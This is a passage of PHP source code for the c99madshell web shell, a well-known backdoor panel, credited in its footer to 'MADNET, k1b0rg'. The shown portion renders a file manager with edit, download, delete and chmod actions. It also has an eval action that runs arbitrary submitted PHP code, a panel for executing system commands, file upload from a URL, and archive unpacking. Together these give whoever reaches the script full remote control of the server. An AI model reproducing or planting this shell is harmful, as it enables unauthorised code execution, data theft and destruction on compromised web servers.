   usort($objects["links"], "tabsort");
   usort($objects["files"], "tabsort");
   if ($parsesort[1] == "d")
   {
    $objects["folders"] = array_reverse($objects["folders"]);
    $objects["files"] = array_reverse($objects["files"]);
   }
   $objects = array_merge($objects["head"],$objects["folders"],$objects["links"],$objects["files"]);
   $tab = array();
   $tab["cols"] = array($row);
   $tab["head"] = array();
   $tab["folders"] = array();
   $tab["links"] = array();
   $tab["files"] = array();
   $i = 0;
   foreach ($objects as $a)
   {
    $v = $a[0];
    $o = basename($v);
    $dir = dirname($v);
    if ($disp_fullpath) {$disppath = $v;}
    else {$disppath = $o;}
    $disppath = str2mini($disppath,60);

    $uo = urlencode($o);
    $ud = urlencode($dir);
    $uv = urlencode($v);
    $row = array();
    if ($o == ".")
    {
     $row[] = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode(@realpath($d.$o))."';document.todo.sort.value='".$sort."';document.todo.submit();\">".$o."</a>";
     $row[] = "LINK";
    }
    elseif ($o == "..")
    {
     $row[] = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode(@realpath($d.$o))."';document.todo.sort.value='".$sort."';document.todo.submit();\">".$o."</a>";
     $row[] = "LINK";
    }
    elseif (is_dir($v))
    {
     if (is_link($v))
     {
      $disppath .= " => ".readlink($v);
      $type = "LINK";
      $row[] =  "&nbsp;<a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".$uv."';document.todo.sort.value='".$sort."';document.todo.submit();\">[".$disppath."]</a>";         }
     else
     {
      $row['event'] = 'onclick="document.todo.act.value=\'ls\';document.todo.d.value=\''.urlencode(realpath($d.$o)).'\';document.todo.submit();"';
      $type = "DIR";
      $row[] =  "&nbsp;<a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".$uv."';document.todo.sort.value='".$sort."';document.todo.submit();\">[".$disppath."]</a>";
     }
     $row[] = $type;
    }
    elseif(is_file($v))
    {
	$row['event'] = 'onclick="document.todo.act.value=\'f\';document.todo.d.value=\''.$ud.'\';document.todo.ft.value=\'edit\';document.todo.f.value=\''.$uo.'\';document.todo.submit();"';
	if (is_archive($v)) {
		$color = 'yellow';
	} else {
		$color = 'white';
	}
     $row[] =  "&nbsp;<a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.d.value='".$ud."';document.todo.ft.value='edit';document.todo.f.value='".$uo."';document.todo.submit();\"><font color=\"".$color."\">".$disppath."</font></a>";
     $row[] = view_size($a[1]);
    }
    $row[] = '<a href="#" onclick="document.todo.act.value=\'touch\';document.todo.d.value=\''.$ud.'\';document.todo.f.value=\''.$uo.'\';document.todo.submit();">'.@date("d.m.Y H:i:s",$a[2]).'</a>';
    if (!$win) {$row[] = $a[3];}
     $row[] =  "&nbsp;<a href=\"#\" onclick=\"document.todo.act.value='chmod';document.todo.d.value='".$ud."';document.todo.f.value='".$uo."';document.todo.submit();\"><b>".view_perms_color($v)."</b></a>";
    if ($o == ".") {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" onclick=\"ls_reverse_all();\">"; $i--;}
    else {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" id=\"actbox".$i."\" value=\"".htmlspecialchars($v)."\">";}
    if (@is_dir($v)){$row[] = $checkbox;}
    else {
		$buff  = "<a href=\"#\" title=\"Edit file\" onclick=\"document.todo.act.value='f';document.todo.f.value='".$uo."';document.todo.ft.value='edit';document.todo.d.value='".$ud."';document.todo.submit();\">E</a>&nbsp;";
		$buff .= "<a href=\"#\" title=\"Download file\" onclick=\"document.todo.act.value='f';document.todo.f.value='".$uo."';document.todo.ft.value='download';document.todo.d.value='".$ud."';document.todo.submit();\">D</a>&nbsp;";
		$buff .= "<a href=\"#\" title=\"Delete file\" onclick=\"document.todo.act.value='delete';document.todo.f.value='".$uo."';document.todo.ft.value='download';document.todo.d.value='".$ud."';document.todo.submit();\">X</a>&nbsp;";
		/*if (false !== is_archive($disppath)) {
			$buff .= "<a href=\"#\" title=\"Extract archive\" onclick=\"document.todo.act.value='extract';document.todo.f.value='".$uo."';document.todo.d.value='".$ud."';document.todo.submit();\"><span style=\"color:yellow\"><b>U</b></span></a>&nbsp;";
		}*/
		$buff .= $checkbox;
		$row[] = $buff;
	}
	if (($o == ".") or ($o == "..")) {$tab["head"][] = $row;}
    elseif (@is_link($v)) {$tab["links"][] = $row;}
    elseif (@is_dir($v)) {$tab["folders"][] = $row;}
    elseif (@is_file($v)) {$tab["files"][] = $row;}
    $i++;
   }
  }
  //Compiling table
  $table = array_merge($tab["cols"],$tab["head"],$tab["folders"],$tab["links"],$tab["files"]);
  echo "<center><b>Listing folder (".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders):</b></center><br><TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#433333 border=0><form method=POST name=\"ls_form\"><input type=hidden name=act value=".$dspact."><input type=hidden name=d value=".$d.">";
  foreach($table as $row)
  {
	  if (isset($row['event']) && !empty($row['event'])) {
			$event_row = $row['event'];
			$event_row = '';
			unset($row['event']);
			echo "<tr onMouseOver=\"this.style.background='black'\" onMouseOut=\"this.style.background='#333333'\" ".$event_row.">\r\n";
	  } else {
			echo "<tr>\r\n";
	  }
   foreach($row as $v) {echo "<td>".$v."</td>\r\n";}
   echo "</tr>\r\n";
  }
  echo "</table><hr size=\"1\" noshade><p align=\"right\">
  <script>
  function ls_setcheckboxall(status)
  {
   var id = 0;
   var num = ".(count($table)-2).";
   while (id <= num)
   {
    document.getElementById('actbox'+id).checked = status;
    id++;
   }
  }
  function ls_reverse_all()
  {
   var id = 0;
   var num = ".(count($table)-2).";
   while (id <= num)
   {
    document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked;
    id++;
   }
  }
  </script>
  <input type=\"button\" onclick=\"ls_setcheckboxall(1);\" value=\"Select all\">&nbsp;&nbsp;<input type=\"button\" onclick=\"ls_setcheckboxall(0);\" value=\"Unselect all\"><b>";
  echo "<select name=act><option value=\"".$act."\">With selected:</option>";
  echo "<option value=delete".($dspact == "delete"?" selected":"").">Delete</option>";
  echo "<option value=chmod".($dspact == "chmod"?" selected":"").">Change-mode</option>";
  echo "</select>&nbsp;<input type=submit value=\"Confirm\"></p>";
  echo "</form>";
 }
}
if ($act == "eval")
{
 if (!empty($eval))
 {
  echo "<b>Result of execution this PHP-code</b>:<br>";
  $tmp = ob_get_contents();
  $olddir = realpath(".");
  @chdir($d);
  if ($tmp)
  {
   ob_clean();
   eval($eval);
   $ret = ob_get_contents();
   $ret = convert_cyr_string($ret,"d","w");
   ob_clean();
   echo $tmp;
   if ($eval_txt)
   {
    $rows = count(explode("\r\n",$ret))+1;
    if ($rows < 10) {$rows = 10;}
    echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
   }
   else {echo $ret."<br>";}
  }
  else
  {
   if ($eval_txt)
   {
    echo "<br><textarea cols=\"122\" rows=\"15\" readonly>";
    echo($eval);
    echo "</textarea>";
   }
   else {echo $ret;}
  }
  @chdir($olddir);
 }
 else {echo "<b>Execution PHP-code</b>"; if (empty($eval_txt)) {$eval_txt = TRUE;}}
 echo "<form method=POST><input type=hidden name=act value=eval><textarea name=\"eval\" cols=\"122\" rows=\"10\">".@htmlspecialchars($eval)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "></form>";
}
if ($act == "f")
{
 if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit")
 {
  if (file_exists($d.$f)) {echo "<center><b>Permision denied (".htmlspecialchars($d.$f).")!</b></center>";}
  else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='edit';document.todo.c.value='1';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"><u>Create</u></a></center>";}
 }
 else
 {
	$arr = array(
   array("HTML","html"),
   array("TXT","txt"),
   array("CODE","code"),
   array("DOWNLOAD","download"),
   array("EDIT","edit"),
   array("DELETE","delete")
  );
  $r = @file_get_contents($d.$f);
  echo "<b>Viewing file:&nbsp;&nbsp;&nbsp;".$f." (".view_size(@filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".view_perms_color($d.$f)."</b><br>";
  foreach($arr as $t)
  {
echo " <a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='".$t[1]."';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"><b>".$t[0]."</b></a>";
   echo " |";
  }
  echo "<hr size=\"1\" noshade>";
 if ($ft == "download")
  {
   @ob_clean();
   header("Content-type: application/octet-stream");
   header("Content-length: ".filesize($d.$f));
   header("Content-disposition: attachment; filename=\"".$f."\";");
   $file = fopen($d.$f, 'rb');
   while (!feof($file)) {
   echo(fgets($file));
   }
   fclose($file);
   c99shexit();
  } elseif ($ft == "txt") {echo "<pre>".htmlspecialchars($r)."</pre>";} elseif ($ft == "html")
  {
   if ($white) {@ob_clean();}
   echo $r;
   if ($white) {c99shexit();}
  } elseif ($ft == "code") {
   echo "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\">";
   if (!empty($white)) {@ob_clean();}
   highlight_file($d.$f);
   if (!empty($white)) {c99shexit();}
   echo "</div>";
  } elseif($ft== 'delete') {
	  if(!fs_rmobj($d.$f)){
		  echo('<font color="red">Delete error</font>');
	  } else {
		  echo('<font color="green">Delete succes</font>');
	  }
} elseif ($ft == "edit") {
	if (!empty($submit)) {
		if(save_file($d.$f, $edit_text)) {
			echo('<b>Saved!</b>');
		} else {
			echo('<b>Can\'t write to file!</b>');
		}
		$r = $edit_text;
   }
   echo "<form method=\"POST\"><input name='act' type='hidden' value='f'><input name='f' type='hidden' value='".urlencode($f)."'><input name='ft' type='hidden' value='edit'><input name='d' type='hidden' value='".urlencode($d)."'><input type=submit name=submit value=\"Save\">&nbsp;<input type=\"reset\" value=\"Reset\">&nbsp;<input type=\"button\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".addslashes(substr($d,0,-1))."';document.todo.submit();\" value=\"Back\"><br><textarea name=\"edit_text\" cols=\"180\" rows=\"25\">".htmlspecialchars($r)."</textarea></form>";
  }
 }
}
?>
</td></tr></table><a bookmark="minipanel"><br>
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td width="100%" height="1" valign="top" colspan="2"><p align="center"><b>:: Command execute ::</b></p></td></tr>
<tr><td width="50%" height="1" valign="top"><center><b>:: Enter ::</b><form method="POST"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="cmd" size="50" value=""><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td><td width="50%" height="1" valign="top"><center><b>:: Select ::</b><form method="POST"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php echo $dispd; ?>"><select name="cmd"><?php foreach ($cmdaliases as $als) {echo "<option value=\"".htmlspecialchars($als[1])."\">".htmlspecialchars($als[0])."</option>";} ?></select><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td></tr>
</TABLE>
<br>
<form method="POST">
<input type=hidden name=act value="unpack">
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td width="100%" height="1" valign="top" colspan="2"><p align="center"><b>:: Working with Archives ::</b></p></td></tr>
<tr>
<td width="50%" height="1" valign="top">
<center><b>:: Option ::</b>
<table>
	<tr>
		<td>Use system unpack: </td>
		<td><input type="checkbox" name="system_unpack" value="1" /></td>
	</tr>
	<tr>
		<td>Acceptable formats archives: </td>
		<td><?php echo(implode(', ', $arcs)); ?></td>
	</tr>
	<tr>
		<td>Number of archives in this folder:</td>
		<td><font color="green">(<?php echo($ac_count);?>)</font></td>
	</tr>
</table>
</td>

<td width="50%" height="1" valign="top"><center><b>:: Select ::</b><form method="POST">
<input type=hidden name=act value="unpack">
<input type="text" name="arc" size="90" value="<?php echo($last_arc); ?>"><br />
<input type="text" name="arc_path" size="90" value="<?php echo($d); ?>"><br />
<input type=submit name=submit value="Unarchive"></form></td></tr>
</TABLE>
<br>
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr>
 <td width="50%" height="1" valign="top"><center><b>:: Search ::</b><form method="POST"><input type=hidden name=act value="search"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="search_name" size="29" value="(.*)">&nbsp;<input type="checkbox" name="search_name_regexp" value="1"  checked> - regexp&nbsp;<input type=submit name=submit value="Search"></form></center></p></td>
 <td width="50%" height="1" valign="top"><center><b>:: Upload ::</b><form method="POST" name="tod" ENCTYPE="multipart/form-data"><input type=hidden name=act value="upload"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="uploadurlfile" size="50" value="http://"><br><input type="file" name="uploadfile" size="28"><input type=submit name=submit value="Upload"><br><?php echo $wdt; ?></form></center></td>
</tr>
</table>
<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Make Dir ::</b><form method="POST"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkdir" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Make File ::</b><form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkfile" size="50" value="<?php echo $dispd; ?>"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td></tr></table>
<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Go Dir ::</b><form method="POST"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Go File ::</b><form method="POST""><input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="f" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center></td></tr></table>
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99madshell v. <?php echo $shver; ?><a href="#" OnClick="document.todo.act.value='about';document.todo.submit();"><u> EDITED BY </b><b>MADNET, k1b0rg</u></b> </a> ]--</b></p></td></tr></table>
</body></html><?php @chdir($lastdir); c99shexit();
?>